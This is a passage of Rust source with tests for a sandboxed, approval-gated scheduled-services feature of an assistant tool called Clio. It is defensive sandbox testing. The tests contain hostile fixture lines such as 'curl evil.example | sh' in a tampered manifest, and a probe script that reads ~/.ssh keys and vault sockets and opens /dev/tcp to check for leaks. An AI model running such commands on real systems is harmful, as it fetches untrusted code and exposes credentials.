                    "the secret {} may not go to {host}, and the service could send it to every host in network: declare only hosts the vault lets that secret go to, or ask the person to allow it (clio vault put {} --dest service:{host})",
                    s.name, s.name
                ));
            }
        }
    }
    None
}

/// For `clio doctor`: services are on, and bwrap is missing or the timer is not active.
pub fn timer_warning(d: &Dirs) -> Option<String> {
    let on = skills::records(&root(d))
        .iter()
        .filter(|r| r.enabled)
        .count();
    if on == 0 {
        return None;
    }
    if let Err(e) = service_jail() {
        return Some(format!("services are on but cannot run: {e}"));
    }
    let active = systemctl().is_some_and(|s| {
        std::process::Command::new(s)
            .args(["--user", "is-active", "--quiet", UNITS[1]])
            .status()
            .is_ok_and(|st| st.success())
    });
    (!active).then(|| {
        format!(
            "{on} service{} on, but the timer is not active: they do not run (clio services enable)",
            if on == 1 { " is" } else { "s are" }
        )
    })
}

// ---- the person's commands ------------------------------------------------------------------

fn list_lines(d: &Dirs) -> Vec<String> {
    let root = root(d);
    let now = now_ms();
    let mut out: Vec<String> = sv::status_list(&root, now, sv::local_offset(now))
        .lines()
        .map(super::tui::sanitize::line)
        .collect();
    let notices = recent_notices(&root, 5);
    if !notices.is_empty() {
        out.push(String::new());
        out.push("recent notices:".into());
        out.extend(notices.iter().map(|n| {
            format!(
                "{} UTC {}",
                super::stamp(n.at_ms),
                notice_line(n, "service")
            )
        }));
    }
    if !skills::records(&root).is_empty() && !timer_files_exist(&d.home) {
        out.push(String::new());
        out.push("the timer is not set up: nothing runs by itself (clio services enable)".into());
    }
    out
}

fn show_lines(d: &Dirs, name: &str) -> Res<Vec<String>> {
    let root = root(d);
    let rec = sv::record(&root, name).ok_or_else(|| format!("there is no service «{name}»"))?;
    let now = now_ms();
    let mut out: Vec<String> = sv::status_one(&root, &rec, now, sv::local_offset(now))
        .lines()
        .map(super::tui::sanitize::line)
        .collect();
    let r = skills::record(&root, name).ok_or("no record")?;
    let (main, files) = read_tree(&skills::version_dir(&root, name, r.current), sv::MANIFEST)?;
    out.push(String::new());
    for (path, text) in std::iter::once((sv::MANIFEST, main.as_str()))
        .chain(files.iter().map(|f| (f.path.as_str(), f.content.as_str())))
    {
        out.push(format!("--- {path} ---"));
        out.extend(
            super::tui::sanitize::multiline(text)
                .lines()
                .map(str::to_owned),
        );
    }
    Ok(out)
}

fn logs_lines(d: &Dirs, name: &str) -> Res<Vec<String>> {
    let root = root(d);
    sv::record(&root, name).ok_or_else(|| format!("there is no service «{name}»"))?;
    let now = now_ms();
    let offset = sv::local_offset(now);
    let runs = sv::runs(&root, name);
    if runs.is_empty() {
        return Ok(vec![format!("«{name}» has not run yet")]);
    }
    let mut out = vec![];
    for r in runs.iter().rev() {
        out.push(super::tui::sanitize::line(&format!(
            "{} · v{} · by {}{}",
            sv::run_line(r, now, offset),
            r.version,
            r.by,
            if r.limits.is_empty() {
                String::new()
            } else {
                format!(" · {} limits", r.limits)
            }
        )));
        out.extend(
            r.tail
                .lines()
                .map(|l| format!("  {}", super::tui::sanitize::line(l))),
        );
    }
    Ok(out)
}

/// Why a service never runs under the systemd launcher (S-69).
const NOT_SYSTEMD: &str = "services run only under bwrap: the systemd launcher gives no private pid \
namespace on this systemd (PrivatePIDs needs 257), so a service could reach Clio's data and the \
vault's sockets through another process's /proc/<pid>/root";

/// The launcher a service runs under: bwrap, whose own pid namespace and /proc hide every other
/// process, or a refusal that says why.
pub(crate) fn service_jail() -> Res<HostJail> {
    HostJail::with(clio_node::Launcher::Bwrap)
        .map(HostJail::with_user_scopes)
        .map_err(|e| format!("{NOT_SYSTEMD}; and bwrap: {e}"))
}

fn run_now(d: &Dirs, name: &str) -> Res<String> {
    let jail = service_jail()?;
    let runner = Runner::new(d, &jail)?;
    Ok(match runner.run(name, "person")? {
        None => format!("«{name}» is running already: nothing was started"),
        Some(r) => {
            let mut s = format!(
                "«{name}»: {}",
                sv::run_line(&r, now_ms(), sv::local_offset(now_ms()))
            );
            if !r.tail.is_empty() {
                s.push('\n');
                s.push_str(&r.tail);
            }
            s
        }
    })
}

/// `clio services [list|show|on|off|undo|remove|run|logs|enable|disable|run-due]`. The person's:
/// never the model's.
pub fn cmd(d: &Dirs, args: &[String]) -> Res<()> {
    let root = root(d);
    let name = || {
        args.get(1)
            .cloned()
            .ok_or_else(|| format!("clio services {} <name>", args[0]))
    };
    let print = |v: Vec<String>| -> Res<()> {
        for l in v {
            println!("{l}");
        }
        Ok(())
    };
    match args.first().map(String::as_str) {
        None | Some("list") => {
            print(list_lines(d))?;
            println!("\nclio services show|on|off|undo|remove|run|logs <name> · enable|disable");
            Ok(())
        }
        Some("show") => print(show_lines(d, &name()?)?),
        Some("logs") => print(logs_lines(d, &name()?)?),
        Some("off") => say(skills::set_enabled_in(
            &root,
            Kind::Service,
            &name()?,
            false,
            skills::OFF_BY_PERSON,
        )),
        Some("on") => say(skills::set_enabled_in(
            &root,
            Kind::Service,
            &name()?,
            true,
            "",
        )),
        Some("undo") => say(skills::undo_in(&root, Kind::Service, &name()?)),
        Some("run") => say(run_now(d, &name()?)),
        Some("remove") => {
            let n = name()?;
            sv::record(&root, &n).ok_or_else(|| format!("there is no service «{n}»"))?;
            if !args.iter().any(|a| a == "--yes")
                && !super::apply::confirm(&format!(
                    "remove the service «{n}»? it stops running; its versions are kept in removed/"
                ))
            {
                println!("nothing was removed");
                return Ok(());
            }
            say(skills::remove_in(&root, Kind::Service, &n))
        }
        Some("enable") => {
            let exe = std::env::current_exe().map_err(|e| e.to_string())?;
            print(enable_in(&d.home, &exe, systemctl().as_deref())?)
        }
        Some("disable") => print(disable_in(&d.home, systemctl().as_deref())?),
        Some("run-due") => {
            let jail = service_jail()?;
            let runner = Runner::new(d, &jail)?;
            print(run_due(&runner, now_ms()))
        }
        // One service from `run-due`, in its own scope: only if it is still due.
        Some("run-timer") => {
            let n = name()?;
            let jail = service_jail()?;
            let runner = Runner::new(d, &jail)?;
            match runner.run_checked(&n, "timer", Some(now_ms()))? {
                Some(r) => println!("{n}: {}", r.outcome),
                None => println!("{n}: not due, or a run of it is still going"),
            }
            Ok(())
        }
        Some(other) => Err(format!(
            "clio services: unknown {other:?} (list, show, on, off, undo, remove, run, logs, enable, disable, run-due)"
        )),
    }
}

/// `/services [...]` in the chat: the same as `clio services`, in a box. A removal reaches here
/// only after the person said yes to it.
pub fn chat_command(d: &Dirs, args: &str) -> Res<super::tui::commands::Modal> {
    let root = root(d);
    let w: Vec<&str> = args.split_whitespace().collect();
    let (title, lines) = match w.as_slice() {
        [] | ["list"] => ("services", list_lines(d)),
        ["show", n] => ("service", show_lines(d, n)?),
        ["logs", n] => ("service runs", logs_lines(d, n)?),
        [verb, ..] => {
            let done = match w.as_slice() {
                ["off", n] => {
                    skills::set_enabled_in(&root, Kind::Service, n, false, skills::OFF_BY_PERSON)?
                }
                ["on", n] => skills::set_enabled_in(&root, Kind::Service, n, true, "")?,
                ["undo", n] => skills::undo_in(&root, Kind::Service, n)?,
                ["remove", n, "--yes"] => skills::remove_in(&root, Kind::Service, n)?,
                ["run", n] => run_now(d, n)?,
                ["enable"] => {
                    let exe = std::env::current_exe().map_err(|e| e.to_string())?;
                    enable_in(&d.home, &exe, systemctl().as_deref())?.join("\n")
                }
                ["disable"] => disable_in(&d.home, systemctl().as_deref())?.join("\n"),
                _ => return Err(format!("/services: unknown {verb:?}; {FOOT}")),
            };
            let mut l: Vec<String> = super::tui::sanitize::multiline(&done)
                .lines()
                .map(str::to_owned)
                .collect();
            l.push(String::new());
            l.extend(list_lines(d));
            ("services", l)
        }
    };
    let mut m = super::tui::commands::Modal::text(title, lines);
    m.foot = Some(FOOT.into());
    Ok(m)
}

const FOOT: &str = "/services show|on|off|undo|remove|run|logs <name> · enable|disable";

fn say(r: Res<String>) -> Res<()> {
    println!("{}", r?);
    Ok(())
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use std::os::unix::fs::PermissionsExt;
    use std::sync::Arc;
    use std::time::Instant;

    use clio_core::SystemClock;
    use clio_node::Launcher;
    use clio_vault::{Dest, Scope, SecretSpec, Vault};
    use serde_json::json;
    use tempfile::TempDir;

    use super::*;

    /// Not under `/tmp`: a run's `/tmp` is its own, and what it must see (the fake forwarder) has
    /// to be outside it. Short enough for the proxy's socket path.
    fn tmp() -> TempDir {
        let exe = std::env::current_exe().unwrap();
        TempDir::new_in(exe.parent().unwrap().parent().unwrap().parent().unwrap()).unwrap()
    }

    fn dirs_in(root: &Path) -> Dirs {
        let data = root.join("data");
        for p in [
            &data,
            &root.join("home"),
            &root.join("config"),
            &root.join("run/clio"),
        ] {
            mkdir_private(p).unwrap();
        }
        Dirs {
            config: root.join("config"),
            runs: data.join("runs"),
            data,
            runtime: Some(root.join("run/clio")),
            home: root.join("home"),
        }
    }

    fn manifest(name: &str, command: &str) -> Manifest {
        Manifest {
            name: name.into(),
            description: format!("The test service {name}."),
            schedule: sv::Schedule {
                every: "1h".into(),
                at: None,
            },
            command: command.into(),
            verify: "bash run.sh && test -s \"$CLIO_STATE_DIR/n\"".into(),
            network: vec![],
            secrets: vec![],
            writes: vec![],
            reads: vec![],
            limits: sv::Limits {
                cpu_percent: 50,
                memory_mb: 512,
                seconds: 20,
            },
        }
    }

    /// Set aside as the chat does after a review, then approved as the person does.
    fn set_aside(d: &Dirs, m: &Manifest, files: &[SkillFile]) -> clio_toolhost::pending::Pending {
        let md = sv::compose(m);
        let args = json!({"name": m.name, "description": m.description, "skill_md": md,
            "files": files, "sha256": clio_toolhost::skills::digest(&md, files), "draft": "s1",
            "update": false, "verdict": "passes", "notes": "verdict: passes"});
        clio_toolhost::pending::set_aside_service(
            &super::super::pending::state(d),
            "r1",
            "s",
            args,
            "a service always waits for your approval",
            3,
        )
        .unwrap()
    }

    fn approve(d: &Dirs, m: &Manifest, files: &[SkillFile]) {
        let p = set_aside(d, m, files);
        super::super::pending::approve(d, &p.id).unwrap();
    }

    /// `bwrap`, if it runs here.
    fn bwrap() -> Option<HostJail> {
        let h = HostJail::with(Launcher::Bwrap).ok()?;
        let t = tmp();
        if t.path().starts_with("/tmp") {
            eprintln!("SKIPPED (the build folder is under /tmp, which a run does not see)");
            return None;
        }
        let j = HostJob {
            command: "true".into(),
            cwd: t.path().into(),
            home: t.path().into(),
            network: false,
            timeout: Some(Duration::from_secs(10)),
            max_output: 1024,
            masks: vec![],
            shows: vec![],
            read_only: false,
        };
        match h.run(&j) {
            Ok(o) if o.success() => Some(h),
            r => {
                eprintln!("SKIPPED (bwrap cannot start here, nothing was tested): {r:?}");
                None
            }
        }
    }

    /// A runner on `d` whose `clio pi-net` is a stand-in that runs the command after `--` (the
    /// forwarder itself is tested with the proxy).
    fn runner<'a>(d: &'a Dirs, jail: &'a HostJail, root: &Path) -> Runner<'a> {
        let fake = root.join("fake-clio");
        fs::write(&fake, "#!/bin/sh\nwhile [ \"$#\" -gt 0 ] && [ \"$1\" != \"--\" ]; do shift; done\nshift\nexec \"$@\"\n").unwrap();
        fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
        Runner {
            dirs: d,
            jail,
            exe: fake,
            gateway: Some(d.runtime.clone().unwrap().join("vault-gateway.sock")),
            proxy_parent: d.runtime.clone().unwrap(),
        }
    }

    fn everything(root: &Path) -> String {
        let mut out = String::new();
        let mut todo = vec![root.to_path_buf()];
        while let Some(x) = todo.pop() {
            for e in fs::read_dir(&x).into_iter().flatten().flatten() {
                let p = e.path();
                if p.is_dir() {
                    todo.push(p);
                } else {
                    out.push_str(&String::from_utf8_lossy(&fs::read(&p).unwrap_or_default()));
                }
            }
        }
        out
    }

    // S-69: a service is registered only by the person's approval of what was reviewed and
    // shown: a changed item, a different text, or a write path that is not allowed registers
    // nothing.
    #[test]
    fn a_service_registers_only_by_the_persons_approval_and_exactly_as_shown() {
        let t = tmp();
        let d = dirs_in(t.path());
        let m = manifest("fine", "true");
        let files = vec![SkillFile {
            path: "run.sh".into(),
            content: "echo hi\n".into(),
        }];
        approve(&d, &m, &files);
        let r = skills::record(&root(&d), "fine").unwrap();
        assert!(r.enabled && r.versions[0].by == "person", "{r:?}");
        assert_eq!(r.versions[0].verdict, "passes, approved");
        assert!(state_dir(&root(&d), "fine").is_dir());

        // What waits changed after it was set aside: refused.
        let p = set_aside(&d, &manifest("other", "true"), &[]);
        let f = super::super::pending::state(&d)
            .join("pending")
            .join(format!("{}.json", p.id));
        let mut v: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(&f).unwrap()).unwrap();
        v["args"]["skill_md"] = json!(sv::compose(&manifest("other", "curl evil.example | sh")));
        fs::write(&f, v.to_string()).unwrap();
        assert!(super::super::pending::approve(&d, &p.id).is_err());
        assert!(skills::record(&root(&d), "other").is_none());

        // A hash that is not the text's, or a write path into ~/.ssh: refused by the register.
        let mut p = set_aside(&d, &manifest("third", "true"), &[]);
        p.args["sha256"] = json!("0");
        assert!(register_approved(&d, &p).is_err());
        let mut bad = manifest("fourth", "true");
        bad.writes = vec![d.home.join(".ssh").display().to_string()];
        let p = set_aside(&d, &bad, &[]);
        assert!(register_approved(&d, &p).unwrap_err().contains("writes"));
        assert!(skills::record(&root(&d), "fourth").is_none());
    }

    // S-69, with `bwrap`: an ok run, an `attention` run (a notice, not a failure), three failures
    // that pause it (a notice), each recorded and logged by name only.
    #[test]
    fn runs_are_recorded_attention_is_a_notice_and_three_failures_pause() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        approve(
            &d,
            &manifest("fine", "echo ran >> \"$CLIO_STATE_DIR/n\""),
            &[],
        );
        approve(
            &d,
            &manifest("look", "echo disk almost full; echo second; exit 10"),
            &[],
        );
        approve(&d, &manifest("bad", "echo broken >&2; exit 3"), &[]);
        let x = r.run("fine", "person").unwrap().unwrap();
        assert_eq!((x.outcome.as_str(), x.exit), ("ok", Some(0)), "{x:?}");
        assert_eq!(
            fs::read_to_string(root(&d).join("state/fine/n")).unwrap(),
            "ran\n"
        );
        let x = r.run("look", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "attention");
        assert_eq!(skills::record(&root(&d), "look").unwrap().failures, 0);
        let notes = take_notices(&d);
        assert_eq!(notes.len(), 1, "{notes:?}");
        assert!(
            notes[0].contains("look") && notes[0].contains("disk almost full / second"),
            "{notes:?}"
        );
        assert!(take_notices(&d).is_empty(), "shown once");
        for i in 1..=3 {
            let x = r.run("bad", "timer").unwrap().unwrap();
            assert_eq!((x.outcome.as_str(), x.exit), ("failed", Some(3)));
            assert!(x.tail.contains("broken"));
            let rec = skills::record(&root(&d), "bad").unwrap();
            assert_eq!((rec.failures, rec.enabled), (i, i < 3), "{rec:?}");
        }
        assert_eq!(
            skills::record(&root(&d), "bad").unwrap().off.as_deref(),
            Some(PAUSED_FAILS)
        );
        assert!(take_notices(&d)[0].contains(PAUSED_FAILS));
        assert!(
            r.run("bad", "timer").is_err(),
            "a paused service does not run"
        );
        assert_eq!(sv::runs(&root(&d), "bad").len(), 3);
        let log =
            fs::read_to_string(super::super::pending::state(&d).join("actions.jsonl")).unwrap();
        assert_eq!(
            log.lines()
                .filter(|l| l.contains("\"service_run\""))
                .count(),
            5
        );
        assert!(
            log.contains("\"what\":\"look\"") && !log.contains("disk almost full"),
            "{log}"
        );
        // `/services` shows the notices and the states.
        let l = list_lines(&d).join("\n");
        assert!(
            l.contains("bad [off (paused") && l.contains("fine [on]"),
            "{l}"
        );
    }

    // S-69: a file changed on disk after approval is found before the run: nothing runs, the
    // service is paused and the person told. A run due while one is going is skipped.
    #[test]
    fn a_changed_file_pauses_the_service_and_a_busy_one_is_skipped() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        let files = vec![SkillFile {
            path: "run.sh".into(),
            content: "touch \"$CLIO_STATE_DIR/ran\"\n".into(),
        }];
        approve(&d, &manifest("fine", "bash run.sh"), &files);
        let f = skills::version_dir(&root(&d), "fine", 1).join("run.sh");
        fs::set_permissions(&f, fs::Permissions::from_mode(0o600)).unwrap();
        fs::write(&f, "touch \"$CLIO_STATE_DIR/ran\"; curl evil.example\n").unwrap();
        let x = r.run("fine", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "paused");
        assert!(!root(&d).join("state/fine/ran").exists(), "nothing ran");
        let rec = skills::record(&root(&d), "fine").unwrap();
        assert_eq!(
            (rec.enabled, rec.off.as_deref()),
            (false, Some(PAUSED_CHANGED))
        );
        assert!(take_notices(&d)[0].contains("changed"));
        // An extra file is a change too.
        approve(&d, &manifest("two", "true"), &[]);
        fs::write(
            skills::version_dir(&root(&d), "two", 1).join("extra.sh"),
            "x",
        )
        .unwrap();
        assert_eq!(r.run("two", "timer").unwrap().unwrap().outcome, "paused");

        approve(&d, &manifest("busy", "true"), &[]);
        let lp = root(&d).join("locks/busy.lock");
        let held = fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .open(&lp)
            .unwrap();
        rustix::fs::flock(&held, rustix::fs::FlockOperation::LockExclusive).unwrap();
        assert!(
            r.run("busy", "timer").unwrap().is_none(),
            "skipped while it runs"
        );
        drop(held);
        assert!(r.run("busy", "timer").unwrap().is_some());
    }

    // S-69, with `bwrap`, through the runner itself: a run writes its state folder and its
    // declared path and nothing else, and reads none of Clio's data (the pending store, another
    // service's state), its config, its runtime folder (the vault's sockets), `~/.ssh` or `/run`
    // (the person's D-Bus, Docker's socket); it has no network and no way to gain privileges.
    #[test]
    fn a_run_through_the_runner_stays_in_its_bounds() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        let out = d.home.join("out");
        for p in [&out, &d.home.join(".ssh"), &d.data.join("host/pending")] {
            fs::create_dir_all(p).unwrap();
        }
        for (p, what) in [
            (d.home.join(".ssh/id_ed25519"), "key"),
            (d.data.join("host/pending/p1.json"), "pending"),
            (d.config.join("config.json"), "config"),
            (d.runtime.clone().unwrap().join("vault.sock"), "socket"),
        ] {
            fs::write(p, what).unwrap();
        }
        approve(&d, &manifest("other", "true"), &[]);
        fs::write(root(&d).join("state/other/token"), "other's").unwrap();
        let reads = [
            d.home.join(".ssh/id_ed25519"),
            d.data.join("host/pending/p1.json"),
            d.config.join("config.json"),
            d.runtime.clone().unwrap().join("vault.sock"),
            root(&d).join("state/other/token"),
        ];
        let mut script = String::from("echo ran > \"$CLIO_STATE_DIR/n\"\necho out > \"$1/f\"\n");
        for p in &reads {
            script.push_str(&format!(
                "cat {} 2>/dev/null && echo LEAK {}\n",
                quote(&p.display().to_string()),
                p.display()
            ));
        }
        for p in [
            d.home.join("x"),
            d.data.join("x"),
            root(&d).join("state/other/x"),
            PathBuf::from("/var/tmp/clio-svc-x"),
        ] {
            script.push_str(&format!(
                "echo w > {} 2>/dev/null && echo LEAK write {}\n",
                quote(&p.display().to_string()),
                p.display()
            ));
        }
        script.push_str("for f in /run/user/*/bus /run/docker.sock /run/dbus/system_bus_socket; do test -e \"$f\" && echo LEAK $f; done\n");
        script
            .push_str("grep -q '^NoNewPrivs:[[:space:]]*1' /proc/self/status || echo LEAK privs\n");
        script.push_str("(exec 3<>/dev/tcp/1.1.1.1/80) 2>/dev/null && echo LEAK net\n");
        script.push_str("exit 0\n");
        let mut m = manifest(
            "bounded",
            &format!("bash run.sh {}", quote(&out.display().to_string())),
        );
        m.writes = vec![out.display().to_string()];
        let files = vec![SkillFile {
            path: "run.sh".into(),
            content: script,
        }];
        approve(&d, &m, &files);
        let x = r.run("bounded", "person").unwrap().unwrap();
        assert_eq!(x.outcome, "ok", "{x:?}");
        assert!(!x.tail.contains("LEAK"), "{}", x.tail);
        assert_eq!(
            fs::read_to_string(root(&d).join("state/bounded/n")).unwrap(),
            "ran\n"
        );
        assert_eq!(fs::read_to_string(out.join("f")).unwrap(), "out\n");
        assert!(!d.home.join("x").exists() && !d.data.join("x").exists());
        assert!(!root(&d).join("state/other/x").exists());
        assert!(!Path::new("/var/tmp/clio-svc-x").exists());
    }

    // S-69: the systemd launcher cannot hide other processes' /proc/<pid>/root on this systemd,
    // so a service never starts under it: the run is a failure that says why, and nothing ran.
    // (`HostJail::with` only finds the programs; nothing here calls sudo or systemd-run.)
    #[test]
    fn a_service_never_runs_under_the_systemd_launcher() {
        let Ok(jail) = HostJail::with(Launcher::Systemd) else {
            eprintln!("SKIPPED (no systemd launcher programs here)");
            return;
        };
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        let files = vec![SkillFile {
            path: "run.sh".into(),
            content: "touch \"$CLIO_STATE_DIR/ran\"\n".into(),
        }];
        approve(&d, &manifest("fine", "bash run.sh"), &files);
        let x = r.run("fine", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "failed");
        assert!(x.why.contains("only under bwrap"), "{}", x.why);
        assert!(!root(&d).join("state/fine/ran").exists(), "nothing ran");
    }

    // S-69: a secret reaches only the service that declared it, only when the vault binds it to
    // `service:<host>` of a declared host, only as its variable (never on a command line), and it
    // is in no stored run, notice, action log or `service_status`. A locked vault, no vault or an
    // unbound secret is a wait, not a failure, and a wait for the same thing is one entry.
    #[test]
    fn a_secret_reaches_only_its_service_as_its_variable_and_is_never_kept() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let rt = d.runtime.clone().unwrap();
        const VALUE: &str = "s3cr3t-value-0123456789";
        let (v, cap) =
            Vault::init(None, "correct horse battery staple", Arc::new(SystemClock)).unwrap();
        for (name, dest) in [
            ("status-key", "service:example.com"),
            ("web-key", "http_fetch:example.com"),
        ] {
            v.put(
                &cap,
                SecretSpec {
                    name: name.into(),
                    value: VALUE.into(),
                    kind: clio_vault::Kind::ApiKey,
                    destinations: vec![Dest::parse(dest).unwrap()],
                    scope: Scope::Personal,
                    rotate_every_ms: None,
                    expires_at_ms: None,
                },
            )
            .unwrap();
        }
        let v = Arc::new(v);
        let (g, p) = (rt.join("vault-gateway.sock"), rt.join("vault-person.sock"));
        let served = v.clone();
        let person = p.clone();
        std::thread::spawn(move || clio_vault::server::serve(served, &g, &p));
        let end = Instant::now() + Duration::from_secs(5);
        while !person.exists() && Instant::now() < end {
            std::thread::sleep(Duration::from_millis(20));
        }
        let r = runner(&d, &jail, t.path());
        let mut m = manifest(
            "with-key",
            "echo \"key $STATUS_KEY\"; echo \"len ${#STATUS_KEY}\"; echo \"in argv $(cat /proc/[0-9]*/cmdline 2>/dev/null | tr '\\0' ' ' | grep -c 's3cr3[t]')\"; echo \"proxy $HTTPS_PROXY\"",
        );
        m.network = vec!["api.example.com".into()];
        m.secrets = vec![sv::SecretUse {
            name: "status-key".into(),
            env: "STATUS_KEY".into(),
            host: "api.example.com".into(),
        }];
        approve(&d, &m, &[]);
        let x = r.run("with-key", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "ok", "{x:?}");
        assert!(x.tail.contains(&format!("len {}", VALUE.len())), "{x:?}");
        assert!(x.tail.contains("in argv 0"), "{x:?}");
        assert!(x.tail.contains("proxy http://127.0.0.1:18080"), "{x:?}");
        assert!(!x.tail.contains(VALUE), "{x:?}");

        // Bound to another tool: the service waits, it does not fail; again is one entry.
        let mut other = manifest("web", "echo \"key $WEB_KEY\"");
        other.network = vec!["api.example.com".into()];
        other.secrets = vec![sv::SecretUse {
            name: "web-key".into(),
            env: "WEB_KEY".into(),
            host: "api.example.com".into(),
        }];
        approve(&d, &other, &[]);
        for _ in 0..2 {
            let x = r.run("web", "timer").unwrap().unwrap();
            assert_eq!(x.outcome, "waiting", "{x:?}");
            assert!(x.why.contains("web-key"), "{x:?}");
        }
        assert_eq!(sv::runs(&root(&d), "web").len(), 1);
        assert_eq!(skills::record(&root(&d), "web").unwrap().failures, 0);
        // The person is told once, not on every try.
        let told = take_notices(&d);
        assert_eq!(told.len(), 1, "{told:?}");
        assert!(
            told[0].contains("web-key") && told[0].contains("15 minutes"),
            "{told:?}"
        );

        // A host declared with its port: the secret's host is its name (fix: it failed every run).
        let mut ported = manifest("ported", "echo \"len ${#STATUS_KEY}\"");
        ported.network = vec!["api.example.com:8443".into()];
        ported.secrets = m.secrets.clone();
        approve(&d, &ported, &[]);
        let x = r.run("ported", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "ok", "{x:?}");
        assert!(x.tail.contains(&format!("len {}", VALUE.len())), "{x:?}");

        // A second host the vault does not let the secret go to: the run could send it there,
        // so it waits (not a failure) and nothing runs; the draft is refused when the vault can
        // already tell, and not when it cannot (a secret not stored yet).
        let mut two = manifest("two", "echo \"ran $STATUS_KEY\"");
        two.network = vec!["api.example.com".into(), "other.example.net".into()];
        two.secrets = m.secrets.clone();
        let vc = VaultClient::new(&rt.join("vault-gateway.sock"));
        let why = secret_hosts_refused_by(&vc, &two).unwrap();
        assert!(
            why.contains("status-key") && why.contains("other.example.net"),
            "{why}"
        );
        assert_eq!(secret_hosts_refused_by(&vc, &m), None);
        assert_eq!(secret_hosts_refused_by(&vc, &ported), None);
        let mut unknown = two.clone();
        unknown.secrets[0].name = "not-stored-yet".into();
        assert_eq!(secret_hosts_refused_by(&vc, &unknown), None);
        approve(&d, &two, &[]);
        let x = r.run("two", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "waiting", "{x:?}");
        assert!(
            x.why.contains("other.example.net") && !x.tail.contains("ran"),
            "{x:?}"
        );
        assert_eq!(skills::record(&root(&d), "two").unwrap().failures, 0);
        let _ = take_notices(&d);

        // A service that declared nothing gets nothing.
        approve(&d, &manifest("none", "echo \"key [$STATUS_KEY]\""), &[]);
        assert!(
            r.run("none", "timer")
                .unwrap()
                .unwrap()
                .tail
                .contains("key []")
        );

        // The vault locked, then no vault: waits; nothing can be told at draft time.
        v.lock();
        assert_eq!(secret_hosts_refused_by(&vc, &two), None);
        let x = r.run("with-key", "timer").unwrap().unwrap();
        assert_eq!(
            (x.outcome.as_str(), x.why.contains("locked")),
            ("waiting", true),
            "{x:?}"
        );
        let mut gone = runner(&d, &jail, t.path());
        gone.gateway = None;
        let x = gone.run("with-key", "timer").unwrap().unwrap();
        assert_eq!(x.outcome, "waiting");
        assert_eq!(skills::record(&root(&d), "with-key").unwrap().failures, 0);
        // A wait does not move the schedule on: the last real run is the first one.
        let runs = sv::runs(&root(&d), "with-key");
        assert_eq!(sv::last_start(&runs), Some(runs[0].start_ms));

        // Nowhere it is kept: runs, notices, records, the action log, `service_status`.
        assert!(!everything(&root(&d)).contains(VALUE));
        assert!(!everything(&super::super::pending::state(&d)).contains(VALUE));
        let rec = sv::record(&root(&d), "with-key").unwrap();
        assert!(!sv::status_one(&root(&d), &rec, now_ms(), 0).contains(VALUE));
    }

    // S-69: `enable` writes exactly the two unit files, private, and starts the timer with the
    // person's own `systemctl --user` (here a stand-in that records its arguments: no root, no
    // real unit); `disable` removes exactly those two.
    #[test]
    fn enable_writes_only_the_two_units_and_disable_removes_exactly_them() {
        let t = tmp();
        let home = t.path().join("home");
        let units = home.join(".config/systemd/user");
        fs::create_dir_all(&units).unwrap();
        fs::write(units.join("mine.service"), "the person's own").unwrap();
        let log = t.path().join("systemctl.log");
        let fake = t.path().join("systemctl");
        fs::write(
            &fake,
            format!("#!/bin/sh\necho \"$@\" >> {}\n", log.display()),
        )
        .unwrap();
        fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
        let exe = Path::new("/usr/local/bin/clio");
        let said = enable_in(&home, exe, Some(&fake)).unwrap().join("\n");
        let mut names: Vec<String> = fs::read_dir(&units)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        assert_eq!(
            names,
            [
                "clio-services.service",
                "clio-services.timer",
                "mine.service"
            ]
        );
        for u in UNITS {
            let p = units.join(u);
            assert_eq!(
                fs::metadata(&p).unwrap().permissions().mode() & 0o777,
                0o600,
                "{u}"
            );
            assert!(
                said.contains(&p.display().to_string()),
                "it says which files: {said}"
            );
        }
        let svc = fs::read_to_string(units.join(UNITS[0])).unwrap();
        assert!(
            svc.contains("ExecStart=/usr/local/bin/clio services run-due")
                && svc.contains("\nUMask=0077\n"),
            "{svc}"
        );
        let timer = fs::read_to_string(units.join(UNITS[1])).unwrap();
        assert!(
            timer.contains("OnCalendar=minutely") && timer.contains("Persistent=true"),
            "{timer}"
        );
        assert_eq!(
            fs::read_to_string(&log).unwrap(),
            "--user daemon-reload\n--user enable --now clio-services.timer\n"
        );
        assert!(enable_in(&home, Path::new("/opt/my clio/clio"), None).is_err());

        disable_in(&home, Some(&fake)).unwrap();
        let left: Vec<_> = fs::read_dir(&units).unwrap().collect();
        assert_eq!(left.len(), 1, "only the person's own unit is left");
        assert!(
            fs::read_to_string(&log)
                .unwrap()
                .contains("--user disable --now clio-services.timer\n")
        );
        assert!(!fs::read_to_string(&log).unwrap().contains("sudo"));
    }

    // S-69: `run-due` runs what is due and only that; a gap of any length gives one run.
    #[test]
    fn run_due_runs_what_is_due_once() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        approve(
            &d,
            &manifest("hourly", "echo x >> \"$CLIO_STATE_DIR/n\""),
            &[],
        );
        let now = now_ms();
        assert_eq!(run_due(&r, now), ["hourly: ok"]);
        assert!(
            run_due(&r, now + 60_000).is_empty(),
            "not due a minute later"
        );
        assert_eq!(
            run_due(&r, now + 3 * 3_600_000),
            ["hourly: ok"],
            "one catch-up after a gap"
        );
        assert_eq!(
            fs::read_to_string(root(&d).join("state/hourly/n")).unwrap(),
            "x\nx\n"
        );
        skills::set_enabled_in(
            &root(&d),
            Kind::Service,
            "hourly",
            false,
            skills::OFF_BY_PERSON,
        )
